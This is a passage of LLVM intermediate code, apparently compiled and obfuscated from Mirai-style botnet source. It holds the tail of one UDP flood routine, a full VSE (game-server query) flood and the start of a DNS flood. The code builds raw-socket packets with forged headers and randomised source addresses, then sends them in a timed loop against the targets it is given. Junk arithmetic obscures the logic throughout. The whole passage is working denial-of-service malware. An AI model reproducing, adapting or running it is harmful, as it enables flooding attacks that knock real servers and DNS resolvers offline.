  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 2
  %334 = load i16, i16* %333, align 2
  %335 = load i16, i16* %20, align 2
  %336 = zext i16 %335 to i64
  %337 = add i64 8, 5482929316647978475
  %338 = add i64 %337, %336
  %339 = sub i64 %338, 5482929316647978475
  %340 = add i64 8, %336
  %341 = trunc i64 %339 to i32
  %342 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %329, i8* %331, i16 zeroext %334, i32 %341)
  %343 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %344 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %343, i32 0, i32 3
  store i16 %342, i16* %344, align 2
  %345 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %346 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %345, i32 0, i32 1
  %347 = load i16, i16* %346, align 2
  %348 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %349 = load i32, i32* %11, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %351, i32 0, i32 0
  %353 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %352, i32 0, i32 1
  store i16 %347, i16* %353, align 2
  %354 = load i32, i32* %12, align 4
  %355 = load i8*, i8** %26, align 8
  %356 = load i16, i16* %20, align 2
  %357 = zext i16 %356 to i64
  %358 = sub i64 0, %357
  %359 = sub i64 28, %358
  %360 = add i64 28, %357
  %361 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %362 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 0
  %367 = bitcast %struct.sockaddr_in* %366 to %struct.sockaddr*
  store %struct.sockaddr* %367, %struct.sockaddr** %361, align 8
  %368 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %369 = load %struct.sockaddr*, %struct.sockaddr** %368, align 8
  %370 = call i64 @sendto(i32 %354, i8* %355, i64 %359, i32 16384, %struct.sockaddr* %369, i32 16)
  br label %371

; <label>:371:                                    ; preds = %319
  %372 = load i32, i32* %11, align 4
  %373 = sub i32 0, 1
  %374 = sub i32 %372, %373
  %375 = add nsw i32 %372, 1
  store i32 %374, i32* %11, align 4
  br label %223

; <label>:376:                                    ; preds = %223
  %377 = call i64 @time(i64* null) #6
  %378 = load i32, i32* %23, align 4
  %379 = sext i32 %378 to i64
  %380 = icmp sgt i64 %377, %379
  br i1 %380, label %381, label %382

; <label>:381:                                    ; preds = %376
  br label %383

; <label>:382:                                    ; preds = %376
  br label %222

; <label>:383:                                    ; preds = %381, %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 %58, -1012072299870127219
  %62 = add i64 %61, %60
  %63 = add i64 %62, -1012072299870127219
  %64 = add nsw i64 %58, %60
  %65 = trunc i64 %63 to i32
  store i32 %65, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 40)
  %66 = call i8* @table_retrieve_val(i32 40, i32* %21)
  store i8* %66, i8** %20, align 8
  %67 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %67, i32* %12, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %5
  br label %372

; <label>:70:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %71 = load i32, i32* %12, align 4
  %72 = bitcast i32* %11 to i8*
  %73 = call i32 @setsockopt(i32 %71, i32 0, i32 3, i8* %72, i32 4) #6
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %78

; <label>:75:                                     ; preds = %70
  %76 = load i32, i32* %12, align 4
  %77 = call i32 @close(i32 %76)
  br label %372

; <label>:78:                                     ; preds = %70
  store i32 0, i32* %11, align 4
  br label %79

; <label>:79:                                     ; preds = %221, %78
  %80 = load i32, i32* %11, align 4
  %81 = load i8, i8* %7, align 1
  %82 = zext i8 %81 to i32
  %83 = icmp slt i32 %80, %82
  br i1 %83, label %84, label %227

; <label>:84:                                     ; preds = %79
  %85 = call noalias i8* @calloc(i64 128, i64 1) #6
  %86 = load i8**, i8*** %13, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  store i8* %85, i8** %89, align 8
  %90 = load i8**, i8*** %13, align 8
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8*, i8** %90, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  store %struct.iphdr* %95, %struct.iphdr** %23, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i64 1
  %98 = bitcast %struct.iphdr* %97 to %struct.udphdr*
  store %struct.udphdr* %98, %struct.udphdr** %24, align 8
  %99 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %100 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %99, i64 1
  %101 = bitcast %struct.udphdr* %100 to i8*
  store i8* %101, i8** %25, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = xor i8 %104, -1
  %106 = xor i8 15, -1
  %107 = xor i8 23, -1
  %108 = or i8 %105, %106
  %109 = or i8 23, %107
  %110 = xor i8 %108, -1
  %111 = and i8 %110, %109
  %112 = and i8 %104, 15
  %113 = xor i8 %111, -1
  %114 = xor i8 64, -1
  %115 = xor i8 49, -1
  %116 = and i8 %113, 49
  %117 = and i8 %111, %115
  %118 = and i8 %114, 49
  %119 = and i8 64, %115
  %120 = or i8 %116, %117
  %121 = or i8 %118, %119
  %122 = xor i8 %120, %121
  %123 = or i8 %113, %114
  %124 = xor i8 %123, -1
  %125 = or i8 49, %115
  %126 = and i8 %124, %125
  %127 = or i8 %122, %126
  %128 = or i8 %111, 64
  store i8 %127, i8* %103, align 4
  %129 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %130 = bitcast %struct.iphdr* %129 to i8*
  %131 = load i8, i8* %130, align 4
  %132 = xor i8 %131, -1
  %133 = xor i8 -16, -1
  %134 = xor i8 -54, -1
  %135 = or i8 %132, %133
  %136 = or i8 -54, %134
  %137 = xor i8 %135, -1
  %138 = and i8 %137, %136
  %139 = and i8 %131, -16
  %140 = xor i8 %138, -1
  %141 = xor i8 5, -1
  %142 = xor i8 -1, -1
  %143 = and i8 %140, -1
  %144 = and i8 %138, %142
  %145 = and i8 %141, -1
  %146 = and i8 5, %142
  %147 = or i8 %143, %144
  %148 = or i8 %145, %146
  %149 = xor i8 %147, %148
  %150 = or i8 %140, %141
  %151 = xor i8 %150, -1
  %152 = or i8 -1, %142
  %153 = and i8 %151, %152
  %154 = or i8 %149, %153
  %155 = or i8 %138, 5
  store i8 %154, i8* %130, align 4
  %156 = load i8, i8* %14, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %21, align 4
  %160 = sext i32 %159 to i64
  %161 = sub i64 0, %160
  %162 = sub i64 32, %161
  %163 = add i64 32, %160
  %164 = trunc i64 %162 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 2
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %15, align 2
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 3
  store i16 %169, i16* %171, align 4
  %172 = load i8, i8* %16, align 1
  %173 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 5
  store i8 %172, i8* %174, align 4
  %175 = load i8, i8* %17, align 1
  %176 = icmp ne i8 %175, 0
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %84
  %178 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 4
  store i16 %178, i16* %180, align 2
  br label %181

; <label>:181:                                    ; preds = %177, %84
  %182 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 6
  store i8 17, i8* %183, align 1
  %184 = load i32, i32* @LOCAL_ADDR, align 4
  %185 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 8
  store i32 %184, i32* %186, align 4
  %187 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %188 = load i32, i32* %11, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i32 0, i32 1
  %192 = load i32, i32* %191, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 9
  store i32 %192, i32* %194, align 4
  %195 = load i16, i16* %18, align 2
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %198 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %197, i32 0, i32 0
  store i16 %196, i16* %198, align 2
  %199 = load i16, i16* %19, align 2
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %202 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %201, i32 0, i32 1
  store i16 %200, i16* %202, align 2
  %203 = load i32, i32* %21, align 4
  %204 = sext i32 %203 to i64
  %205 = sub i64 0, 12
  %206 = sub i64 0, %204
  %207 = add i64 %205, %206
  %208 = sub i64 0, %207
  %209 = add i64 12, %204
  %210 = trunc i64 %208 to i16
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %213 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %212, i32 0, i32 2
  store i16 %211, i16* %213, align 2
  %214 = load i8*, i8** %25, align 8
  %215 = bitcast i8* %214 to i32*
  store i32 -1, i32* %215, align 4
  %216 = load i8*, i8** %25, align 8
  %217 = getelementptr inbounds i8, i8* %216, i64 4
  store i8* %217, i8** %25, align 8
  %218 = load i8*, i8** %25, align 8
  %219 = load i8*, i8** %20, align 8
  %220 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %218, i8* %219, i32 %220)
  br label %221

; <label>:221:                                    ; preds = %181
  %222 = load i32, i32* %11, align 4
  %223 = add i32 %222, -62646152
  %224 = add i32 %223, 1
  %225 = sub i32 %224, -62646152
  %226 = add nsw i32 %222, 1
  store i32 %225, i32* %11, align 4
  br label %79

; <label>:227:                                    ; preds = %79
  br label %228

; <label>:228:                                    ; preds = %371, %227
  store i32 0, i32* %11, align 4
  br label %229

; <label>:229:                                    ; preds = %358, %228
  %230 = load i32, i32* %11, align 4
  %231 = load i8, i8* %7, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp slt i32 %230, %232
  br i1 %233, label %234, label %365

; <label>:234:                                    ; preds = %229
  %235 = load i8**, i8*** %13, align 8
  %236 = load i32, i32* %11, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds i8*, i8** %235, i64 %237
  %239 = load i8*, i8** %238, align 8
  store i8* %239, i8** %26, align 8
  %240 = load i8*, i8** %26, align 8
  %241 = bitcast i8* %240 to %struct.iphdr*
  store %struct.iphdr* %241, %struct.iphdr** %27, align 8
  %242 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i64 1
  %244 = bitcast %struct.iphdr* %243 to %struct.udphdr*
  store %struct.udphdr* %244, %struct.udphdr** %28, align 8
  %245 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %246 = load i32, i32* %11, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i64 %247
  %249 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i32 0, i32 2
  %250 = load i8, i8* %249, align 4
  %251 = zext i8 %250 to i32
  %252 = icmp slt i32 %251, 32
  br i1 %252, label %253, label %277

; <label>:253:                                    ; preds = %234
  %254 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %255 = load i32, i32* %11, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %256
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %257, i32 0, i32 1
  %259 = load i32, i32* %258, align 4
  %260 = call i32 @ntohl(i32 %259) #7
  %261 = call i32 @rand_next()
  %262 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %263 = load i32, i32* %11, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 2
  %267 = load i8, i8* %266, align 4
  %268 = zext i8 %267 to i32
  %269 = lshr i32 %261, %268
  %270 = add i32 %260, -341790767
  %271 = add i32 %270, %269
  %272 = sub i32 %271, -341790767
  %273 = add i32 %260, %269
  %274 = call i32 @htonl(i32 %272) #7
  %275 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 9
  store i32 %274, i32* %276, align 4
  br label %277

; <label>:277:                                    ; preds = %253, %234
  %278 = load i16, i16* %15, align 2
  %279 = zext i16 %278 to i32
  %280 = icmp eq i32 %279, 65535
  br i1 %280, label %281, label %286

; <label>:281:                                    ; preds = %277
  %282 = call i32 @rand_next()
  %283 = trunc i32 %282 to i16
  %284 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %281, %277
  %287 = load i16, i16* %18, align 2
  %288 = zext i16 %287 to i32
  %289 = icmp eq i32 %288, 65535
  br i1 %289, label %290, label %295

; <label>:290:                                    ; preds = %286
  %291 = call i32 @rand_next()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 0
  store i16 %292, i16* %294, align 2
  br label %295

; <label>:295:                                    ; preds = %290, %286
  %296 = load i16, i16* %19, align 2
  %297 = zext i16 %296 to i32
  %298 = icmp eq i32 %297, 65535
  br i1 %298, label %299, label %304

; <label>:299:                                    ; preds = %295
  %300 = call i32 @rand_next()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 1
  store i16 %301, i16* %303, align 2
  br label %304

; <label>:304:                                    ; preds = %299, %295
  %305 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 7
  store i16 0, i16* %306, align 2
  %307 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %308 = bitcast %struct.iphdr* %307 to i16*
  %309 = call zeroext i16 @checksum_generic(i16* %308, i32 20)
  %310 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 7
  store i16 %309, i16* %311, align 2
  %312 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 3
  store i16 0, i16* %313, align 2
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %315 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %316 = bitcast %struct.udphdr* %315 to i8*
  %317 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 2
  %319 = load i16, i16* %318, align 2
  %320 = load i32, i32* %21, align 4
  %321 = sext i32 %320 to i64
  %322 = sub i64 0, 12
  %323 = sub i64 0, %321
  %324 = add i64 %322, %323
  %325 = sub i64 0, %324
  %326 = add i64 12, %321
  %327 = trunc i64 %325 to i32
  %328 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %314, i8* %316, i16 zeroext %319, i32 %327)
  %329 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 2
  %331 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 1
  %333 = load i16, i16* %332, align 2
  %334 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %335 = load i32, i32* %11, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i64 %336
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i32 0, i32 0
  %339 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %338, i32 0, i32 1
  store i16 %333, i16* %339, align 2
  %340 = load i32, i32* %12, align 4
  %341 = load i8*, i8** %26, align 8
  %342 = load i32, i32* %21, align 4
  %343 = sext i32 %342 to i64
  %344 = sub i64 32, 1281321156257378002
  %345 = add i64 %344, %343
  %346 = add i64 %345, 1281321156257378002
  %347 = add i64 32, %343
  %348 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %349 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %350 = load i32, i32* %11, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 0
  %354 = bitcast %struct.sockaddr_in* %353 to %struct.sockaddr*
  store %struct.sockaddr* %354, %struct.sockaddr** %348, align 8
  %355 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %356 = load %struct.sockaddr*, %struct.sockaddr** %355, align 8
  %357 = call i64 @sendto(i32 %340, i8* %341, i64 %346, i32 16384, %struct.sockaddr* %356, i32 16)
  br label %358

; <label>:358:                                    ; preds = %304
  %359 = load i32, i32* %11, align 4
  %360 = sub i32 0, %359
  %361 = sub i32 0, 1
  %362 = add i32 %360, %361
  %363 = sub i32 0, %362
  %364 = add nsw i32 %359, 1
  store i32 %363, i32* %11, align 4
  br label %229

; <label>:365:                                    ; preds = %229
  %366 = call i64 @time(i64* null) #6
  %367 = load i32, i32* %22, align 4
  %368 = sext i32 %367 to i64
  %369 = icmp sgt i64 %366, %368
  br i1 %369, label %370, label %371

; <label>:370:                                    ; preds = %365
  br label %372

; <label>:371:                                    ; preds = %365
  br label %228

; <label>:372:                                    ; preds = %370, %75, %69
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 %81, 6342121346289140209
  %85 = add i64 %84, %83
  %86 = add i64 %85, 6342121346289140209
  %87 = add nsw i64 %81, %83
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %25, align 4
  %89 = load i8*, i8** %22, align 8
  %90 = icmp eq i8* %89, null
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %5
  br label %519

; <label>:92:                                     ; preds = %5
  %93 = load i8*, i8** %22, align 8
  %94 = call i32 @util_strlen(i8* %93)
  store i32 %94, i32* %23, align 4
  %95 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %95, i32* %12, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %92
  br label %519

; <label>:98:                                     ; preds = %92
  store i32 1, i32* %11, align 4
  %99 = load i32, i32* %12, align 4
  %100 = bitcast i32* %11 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 0, i32 3, i8* %100, i32 4) #6
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  br label %519

; <label>:106:                                    ; preds = %98
  store i32 0, i32* %11, align 4
  br label %107

; <label>:107:                                    ; preds = %313, %106
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  br i1 %111, label %112, label %320

; <label>:112:                                    ; preds = %107
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %113 = call noalias i8* @calloc(i64 600, i64 1) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
